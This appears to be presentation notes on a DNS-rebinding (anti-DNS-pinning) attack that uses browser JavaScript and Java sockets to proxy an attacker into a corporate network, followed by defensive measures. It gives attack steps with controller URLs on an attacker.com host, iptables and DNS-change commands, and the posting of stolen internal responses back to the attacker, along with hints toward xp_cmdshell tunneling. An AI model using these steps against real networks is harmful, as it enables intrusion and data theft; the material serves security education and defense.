### Anti-DNS Pinning Demonstration: JavaScript & XMLHTTPRequest

#### Attack Setup
1. **DNS Record Configuration**:
   - A DNS record is created, pointing to the secondary IP address of the attack web server.
   - Example: `addrecord A fkduia.attacker.com 12.0.0.81`

2. **Network Topology**:
   - **Attack Workstation**
   - **Victim Workstation**
   - **Corporate Network (10.0.0.0/24)**
   - **Internet (12.0.0.0/24)**
   - **Demonstration Sequence**:
     - **Linux Server**
     - **Windows Server**
     - **XSS Infected Server**

#### Attack Steps

1. **Controller Script Polling**:
   - The victim's browser polls the controller script and receives a command to create a new iframe.
   - URL: `http://12.0.0.80/cgi-bin/controller.pl?command=poll&sessionid=10`

2. **Iframe Source Configuration**:
   - The iframe source points to a random hostname and the controller script.
   - URL: `http://fkduia.attacker.com/cgi-bin/controller.pl?command=getproxyiframe&sessionid=10`

3. **Image Request Notification**:
   - Once the iframe loads on the victim's browser, it notifies the attack web server with an image request.
   - URL: `http://12.0.0.80/cgi-bin/controller.pl?command=iframeloaded&sessionid=10&proxyid=3`

4. **Firewall Rule and DNS Record Change**:
   - The controller script adds a firewall rule to block the victim from reaching the secondary IP address.
   - Command: `iptables -A INPUT -p tcp --d 12.0.0.81/32 --dport 80 -j DROP`
   - The DNS record is then changed to point to the targeted server.
   - Command: `addrecord A fkduia.attacker.com 10.0.0.30`

5. **Proxied HTTP Request Retrieval**:
   - The iframe retrieves the next proxied HTTP request from the attack web server’s primary IP address.
   - URL: `http://12.0.0.80/cgi-bin/controller.pl?command=getnextrequest&sessionid=10&proxyid=3`

6. **XMLHTTPRequest Object Creation**:
   - The iframe creates an XMLHTTPRequest object, pointing it at the supplied URL.
   - The web browser attempts to connect to the cached IP address but fails due to the firewall rule.
   - URL: `http://fkduia.attacker.com/cgi-bin/controller.pl?command=getnextrequest&sessionid=10&proxyid=3`

7. **DNS Cache Dump and Requery**:
   - The browser continues to retry until it reaches its timeout threshold, then dumps its cache and re-queries the attack DNS server.
   - DNS Query: `query fkduia.attacker.com`
   - DNS Response: `response 10.0.0.30`

8. **Connection to Targeted Web Server**:
   - The XMLHTTPRequest object in the iframe connects to the targeted web server and issues the request.
   - URL: `http://fkduia.attacker.com/`

9. **Firewall Rule Disabling**:
   - The iframe sends a message to the controller script via an image request, indicating that the firewall rule can be disabled.
   - URL: `http://12.0.0.80/cgi-bin/controller.pl?command=antipincomplete&sessionid=10&proxyid=3`

10. **HTTP Response Posting**:
    - The HTTP response is put into form fields and posted back to the controller script on the attack web server’s primary IP address.
    - URL: `POST http://12.0.0.80/cgi-bin/controller.pl command=postdata&sessionid=10&proxyid=3&response=Internal...`

11. **Response Insertion and Proxy Communication**:
    - The controller script inserts the response into the database.
    - The proxy server sees the response and sends it back to the attacker’s browser.
    - Example Response: `HTTP/1.1 200 OK Content-Type: text/html ...`

### Limitations and Techniques

- **Lack of Host Header Control**: Only allows access to the default website.
- **Host Headers and Referral Headers**: Not considered security measures.
- **Secondary Vulnerabilities**: Find a web server with additional vulnerabilities.
- **Complex Attacks**: Techniques like chunked encoding are not possible.
- **SQL Injection**: Ideal for this type of attack.
- **Tertiary Flaws**: Use flaws like `xp_cmdshell` to start more flexible and traditional tunneling.
- **Java**: Allows for more sophisticated techniques.

### Java Security Refresher

- **Types of Applets**:
  - **Trusted**: Digitally signed or installed locally.
    - Local file access
    - Process creation and termination
    - Unlimited network access (listen and connect)
  - **Untrusted**:
    - No file access
    - No process management
    - Only outbound socket access to the origin server

### LiveConnect

- **Origins**: Netscape Plugin Application Programming Interface (NPAPI) from Navigator 4.0.
- **Functionality**:
  - Two-way bridge between Java applets and JavaScript.
  - JavaScript can instantiate Java objects.
  - Java applets can access the HTML DOM of the host page.
  - Supported by Firefox and Opera, but not Internet Explorer.

### Java and DNS Pinning

- **Sun’s JVM**:
  - Has its own DNS resolver and pinning logic.
  - Not vulnerable to standard attacks.
- **JavaScript and Java Sockets**:
  - If JavaScript creates a Java socket object back to the document’s origin server, the JVM will immediately query DNS.
  - If the attacker has already changed the DNS record for the origin server, the JVM will connect the socket to any IP address.
- **Improvements over XMLHTTPRequest**:
  - No delay caused by DNS cache timeouts.
  - Direct socket access removes HTTP host header limitations.
  - Both text and binary protocols are possible.
  - Full TCP and UDP support by Java classes.
  - Limited ICMP support.
  - Potential applications: Telnet, SSH, SNMP, database protocols, SMB, etc.

### Java-based Attack Demonstration

- **Similar to JavaScript Technique**:
  - Uses a SOCKS proxy for the attacker instead of HTTP.
  - Hummingbird generic SOCKS client used by the attacker.
  - No need for firewall or delay in DNS changes.
  - Uses `java.nio.channels.SocketChannel`.
  - Socket reads and writes handled asynchronously with separate JavaScript execution paths (pseudo-threads).
  - Port scanning is easy and fast.

### Defense Strategies

#### Browser Pinning
- **Permanent Caching**: Change browsers to permanently pin their cache.
- **Limitations**:
  - Does not address browser-restart attacks.
  - Does not stop attacks using browser plugins (Java, Flash, ActiveX, etc.).
  - Unused when HTTP proxy servers are involved.

#### Browser Security Policies
- **Increased Granularity**: IE security zones (XMLHTTPRequest).
- **NoScript**: Provides some benefit on Firefox but offers little granularity.
- **Add Security Zones to Firefox**.

#### Other Defensive Ideas
- **Disabling JavaScript and Java Applets**: Not practical at most companies.
- **Security Gateways**: Can filter web content but require heavy administration.
- **LocalRodeo**:
  - Firefox add-on by Justus Winter and Martin Johns.
  - Detects and blocks IP address changes in the browser’s DNS cache.
  - Still experimental/beta.
  - Does not address other plugins or proxy servers.

#### More Internal Attention
- **Running Code Safely**: Running code downloaded from the Internet may get safer but will never be entirely safe.
- **Perimeter Firewalls**: Do not rely solely on them.
- **Advanced Techniques**:
  - Harden all servers, not just those in the DMZ.
  - Network segmentation.
  - Use strong protocols: SSH, SSL, IPSec.
  - Application firewalls.
  - Additional security measures: NIPS, HIPS, WIDS, etc.

### Questions and References

- [Mozilla Same-Origin Policy](http://www.mozilla.org/projects/security/components/same-origin.html)
- [RFC 2616 Section 15.3](http://www.ietf.org/rfc/rfc2616.txt)
- [Timeless Blog](http://viper.haque.net/~timeless/blog/11/)
- [Shampoo Antville Story](http://shampoo.antville.org/stories/1451301/)
- [Microsoft MSDN](http://msdn2.microsoft.com/en-us/library/ms175046.aspx)
- [CGI Security](http://www.cgisecurity.com/lib/XmlHTTPRequest.shtml)
- [Mozilla Bugzilla](https://bugzilla.mozilla.org/show_bug.cgi?id=297078)
- [Mozilla Bugzilla](https://bugzilla.mozilla.org/show_bug.cgi?id=302263)
- [W3C Frames](http://www.w3.org/TR/html401/present/frames.html#h-16.5)
- [W3C XMLHttpRequest](http://www.w3.org/TR/XMLHttpRequest/)
- [Microsoft MSDN](http://msdn2.microsoft.com/en-us/library/ms535874.aspx)
- [Mozilla Developer Network](http://developer.mozilla.org/en/docs/XMLHttpRequest)
- [Binary Streams with XMLHttpRequest](http://mgran.blogspot.com/2006/08/downloading-binary-streams-with.html)
- [GNU Citizen Backframe](http://www.gnucitizen.org/projects/backframe/)
- [Dynamic CSS](http://www.bobbyvandersluis.com/articles/dynamicCSS.php)
- [IRT Article](http://www.irt.org/articles/js065/)
- [Sun Java FAQ](http://java.sun.com/sfaq/)
- [Shampoo Antville Story](http://shampoo.antville.org/stories/1566124/)
- [Mozilla LiveConnect](http://developer.mozilla.org/en/docs/LiveConnect)
- [Sun Java JSObject](http://java.sun.com/products/plugin/1.3/docs/jsobject.html)
- [Java DatagramSocket](http://java.sun.com/j2se/1.5.0/docs/api/java/net/DatagramSocket.html)
- [Java Socket](http://java.sun.com/j2se/1.5.0/docs/api/java/net/Socket.html)
- [Java InetAddress](http://java.sun.com/j2se/1.5.0/docs/api/java/net/InetAddress.html#isReachable(int))
- [RFC 1928](http://tools.ietf.org/html/rfc1928)
- [Hummingbird SOCKS](http://www.hummingbird.com/products/nc/socks/index.html)
- [Mozilla setTimeout](http://developer.mozilla.org/en/docs/DOM:window.setTimeout)
- [Mozilla setInterval](http://developer.mozilla.org/en/docs/DOM:window.setInterval)
- [Jumperz Net](http://www.jumperz.net/index.php?i=2&a=3&b=3)
- [Adobe ActionScript Dictionary](http://www.adobe.com/support/flash/action_scripts/actionscript_dictionary/actionscript_dictionary867.html)
- [Mozilla ConfigPolicy](http://www.mozilla.org/projects/security/components/ConfigPolicy.html)
- [NoScript](http://noscript.net/)
- [LocalRodeo](http://databasement.net/labs/localrodeo/)